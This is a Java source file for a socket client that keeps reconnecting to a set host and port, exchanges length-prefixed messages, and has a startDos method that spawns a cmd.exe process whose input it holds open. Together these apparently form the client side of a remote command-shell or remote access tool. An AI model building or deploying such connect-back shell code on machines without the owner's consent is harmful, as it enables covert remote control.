
package application.connection;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import application.Functions;
import application.MainController;
import application.Reciver;

import static application.SKcleint.start_connection;
import static application.connection.Client.SPL;

/**
 *
 * @author Adem
 */
public class Client extends Thread{
	private Object lock=new Object();
	private boolean stop=false;
	private Socket socket;
	public Process process;
	public OutputStream DosWriter;
	private String ip;
	private int port;
	private Handler controller;
	private int clientNumber;
	private volatile boolean connected=false;
	public final static String SPL = "\\\\+*-";
	public Client(String ip, int port,Handler controller,int clientNumber) {
		this.controller=controller;
		this.ip = ip;
		this.port = port;
		this.clientNumber=clientNumber;
		start();
		
	}
	@Override
	public void run() {
		startconn();
	}
	public synchronized Socket getSocket(){
	 return socket;
	}
	public void Stop_client(){
	synchronized (lock) {
		stop=true;
		try {
			if(socket!=null)
				socket.close();
			if(DosWriter!=null)
			DosWriter.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}	
	}
	public  void startconn() {
		boolean conn = false;
		connected=false;
		while (!conn & !stop) {
			synchronized (lock) {
			try {
				
				socket = new Socket(ip, port);
				conn = true;
				new ClientFromServer(socket.getInputStream(), controller);
				connected=true;
				System.out.println("client succefult connected");
				controller.notify(clientNumber, ip+":"+port, "online");
			} catch (IOException ex) {

			}
			
			}
			try {
				Thread.sleep(40);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}
	}
	public SocketAddress getSocketAdress(){
		return socket.getRemoteSocketAddress();
	}
	public void send(String data) {
		try {

			DataOutputStream dOut = new DataOutputStream(socket.getOutputStream());
			byte[] b = Functions.Str2Byte(data);
			dOut.writeInt(b.length);
			dOut.write(b);
			dOut.flush();
			/*OutputStream dOut = socket.getOutputStream();
			byte[] b=Functions.Str2Byte(data);
	        int toSendLen = b.length;

	        final ByteBuffer bb = ByteBuffer.allocate(Integer.SIZE / Byte.SIZE);
	        bb.order(ByteOrder.BIG_ENDIAN);
	        bb.putInt(toSendLen);
	      
	        dOut.write(bb.array());

	        dOut.write(b);*/

		} catch (IOException e) {

		}
	}

	public void send(byte data[]) {
		try {

			DataOutputStream dOut = new DataOutputStream(socket.getOutputStream());

			dOut.writeInt(data.length);
			dOut.write(data);
			dOut.flush();
			/*OutputStream dOut = socket.getOutputStream();
			
	        int toSendLen = data.length;

	        final ByteBuffer bb = ByteBuffer.allocate(Integer.SIZE / Byte.SIZE);
	        bb.order(ByteOrder.BIG_ENDIAN);
	        bb.putInt(toSendLen);
	      
	        dOut.write(bb.array());
	        dOut.write(data);*/


		} catch (IOException e) {

		}
	}

	public void startDos() throws IOException {

		ProcessBuilder builder = new ProcessBuilder("cmd.exe");
		builder.redirectErrorStream(true);

		process = builder.start();
		DosWriter = process.getOutputStream();

	}

	
	private class ClientFromServer extends Thread{
		private InputStream inputStream;
		private Handler controller;
		
		public ClientFromServer(InputStream inputStream,Handler controller){
			this.inputStream=inputStream;
			this.controller=controller;
			start();
			
		}
		
		@Override
		public void run() {

			try {
			DataInputStream dIn = new DataInputStream(inputStream);
			//MainController mainc= new MainController(socket, this);
			int length;
			while (((length = dIn.readInt()) != 0)) {

				if (length > 0) {
					byte[] message = new byte[length];
					dIn.readFully(message, 0, message.length); // read the message
				//	new Reciver(message, socket, this);
					controller.Data(message,clientNumber);
				}

			}

		} catch (Exception e) {
			controller.notify(clientNumber, ip+":"+port, "offline");
			controller.Exceptions("Error");
			System.out.println("exception");
			try {
				socket.close();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			controller.Diconnected(clientNumber);
			startconn();
		}
			/*InputStream dIn;
			try {
				dIn = socket.getInputStream();
				int length ;
				do {
					byte le[] = new byte[4];
					dIn.read(le, 0, 4); // read the message
					ByteBuffer wrapped = ByteBuffer.wrap(le); 
					length = wrapped.getInt();
					byte[] message = new byte[length];

					if (length > 0) {

						dIn.read(message, 0, message.length); // read the message
						controller.Data(message);
					}
				} while (length != 0);

			} catch (IOException e1) {
				controller.Diconnected();
			} */   
			

		}
		
	}

	public static String Quote(String s) {
		if (s.contains(SPL)) {
			s = "QUT" + s;
			String rx = "(\\\\\\\\\\+)";
			StringBuffer sb = new StringBuffer();
			Pattern p = Pattern.compile(rx);
			Matcher m = p.matcher(s);
			while (m.find()) {
				m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + "#"));
			}
			m.appendTail(sb);
			return sb.toString();
		}

		return s;
	}

	public static String Unquote(String s) {
		if (s.startsWith("QUT")) {
			s = s.substring(3);
			String rx = "(\\\\\\\\\\+)(#)";
			StringBuffer sb = new StringBuffer();
			Pattern p = Pattern.compile(rx);
			Matcher m = p.matcher(s);
			while (m.find()) {
				m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1)));
			}
			m.appendTail(sb);
			return sb.toString();
		}

		return s;
	}
}